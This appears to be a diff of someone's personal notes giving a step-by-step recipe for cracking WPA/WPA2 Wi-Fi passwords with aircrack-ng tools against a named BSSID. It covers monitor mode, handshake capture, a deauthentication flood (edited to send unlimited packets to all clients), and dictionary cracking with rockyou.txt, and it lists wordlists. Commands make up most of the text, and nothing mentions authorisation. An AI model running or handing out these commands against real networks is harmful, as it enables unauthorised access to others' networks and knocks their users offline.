@@ -7,6 +7,7 @@ sudo apt upgrade
 
 ---------- --------
 
+ 
 
 1.sudo ifconfig
 
@@ -20,15 +21,16 @@ output:
 
 			PID Name
 			1568 wpa_supplicant
+
 3. sudo airmon-ng start wlp1s0
 output:
 
 	sudo airmon-ng start wlp1s0
 
 
-		PHY	Interface	Driver		Chipset
+  PHY	Interface	Driver		Chipset
 
-		phy0	wlp1s0		iwlwifi		Intel Corporation Wireless 8260 (rev 3a)
+  phy0	wlp1s0		iwlwifi		Intel Corporation Wireless 8260 (rev 3a)
 				(mac80211 monitor mode vif enabled
 				          for [phy0]wlp1s0 on [phy0]wlp1s0mon)
 				(mac80211 station mode vif disabled
@@ -56,9 +58,8 @@ sudo airodump-ng -c 3 --bssid 3C:7C:3F:B5:F3:A0 -w ./  wlp1s0mon
  
 6.  Open a new terminal window to disconnect the clients connected 
     to the target network.  
- 
-  sudo aireplay-ng -0 10 -a 3C:7C:3F:B5:F3:A0  -c 10:D5:61:EC:E6:B8 wlp1s0mon
-    
+  sudo aireplay-ng -0 0 -a 3C:7C:3F:B5:F3:A0 wlp1s0mon
+     
      aireplay-ng : To inject frames
     -0 : For deauthentication
     10 : No. of deauthentication packets to be sent
@@ -72,19 +73,24 @@ sudo airodump-ng -c 3 --bssid 3C:7C:3F:B5:F3:A0 -w ./  wlp1s0mon
    get something called WPA handshake in the previous window of
     the terminal. 
  
- 7. To decrypt the password. Open the Files application. 
+ 7. To decrypt the password.   
  
- aircrack-ng -a2 -b  3C:7C:3F:B5:F3:A0 -w /u  /usr/share/wordlists/rockyou.txt ./-01.cap
+ sudo aircrack-ng -a2 -b 3C:7C:3F:B5:F3:A0 -w /usr/share/wordlists/rockyou.txt ./-01.cap
  
  aircrack-ng : 802.11 WEP and WPA-PSK keys cracking program
 -a : -a2 for WPA2 & -a for WPA network
 -b : The BSSID of the target network
 -w : Location of the wordlist file
--01.cap :  cap file
+-01.cap : cap file
+ 
+ 
  
  passward lists
   /usr/share/wordlists/rockyou.txt
   /usr/share/wordlists/wifite.txt
   /usr/share/metasploit-framework/data/wordlists/sid.txt
-  /usr/share/metasploit-framework/data/wordlists/common_roots.txt  
+  /usr/share/metasploit-framework/data/wordlists/common_roots.txt 
+   
 https://www.geeksforgeeks.org/linux-unix/how-to-hack-wpa-wpa2-wifi-using-kali-linux/
+
+ 
